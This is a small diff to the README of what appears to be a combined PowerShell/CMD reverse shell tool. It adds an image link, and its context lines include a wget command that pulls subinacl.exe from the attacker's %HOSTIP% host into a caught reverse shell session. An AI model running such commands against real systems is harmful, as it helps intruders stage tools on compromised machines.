@@ -98,6 +98,7 @@ wget -O subinacl.exe http://%HOSTIP%/32/tools/subinacl.exe<br />
 
 The HOSTIP and EXP1 environment variables are already set in the reverse shell caught when using the "Combined PowerShell and CMD Reverse Shell" unless you used a version that didn't require them to be set.
 
+![environment variables are already set in revshell](https://github.com/rtaylor777/ps_cmd_rev_shell/blob/master/why_variables.jpg)
 
 **Entered Text Is Echoed Back**
 
